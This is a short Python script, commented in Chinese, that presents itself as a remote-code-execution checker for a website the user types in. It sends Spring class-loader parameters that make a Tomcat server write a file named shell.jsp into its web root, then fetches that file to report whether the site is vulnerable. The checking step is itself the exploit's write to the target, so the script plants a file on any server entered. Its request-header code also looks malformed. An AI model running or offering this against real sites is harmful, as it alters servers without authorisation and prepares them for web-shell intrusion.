# coding=utf-8
import requests
import fake_useragent
from urllib.parse import urlencode

"""
    JAVA RCE 检测
"""
# 真实url
url = "http://"+input("请输入需要检测的网站:")
canshu = {"class.module.classLoader.resources.context.parent.pipeline.first.pattern": "ck",
          "class.module.classLoader.resources.context.parent.pipeline.first.suffix": ".jsp",
          "class.module.classLoader.resources.context.parent.pipeline.first.directory": "webapps/ROOT",
          "class.module.classLoader.resources.context.parent.pipeline.first.prefix": "shell",
          "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat": ""}
canshu = urlencode(canshu)
# print(url)

# exit()

hearders = {
    fake_useragent.UserAgent().chrome: "application/x-www-form-urlencoded",
}
res = requests.get(url=url+"?"+canshu, headers=hearders)
# print(res.text)
# 如果url没有以/结尾需要加上/
res02 = requests.get(url=url+"shell.jsp", headers=hearders)
print(res02.status_code)
if res02.status_code == 200 and "ck" in res02.text:
    print("存在漏洞")
else:
    print("不存在漏洞")
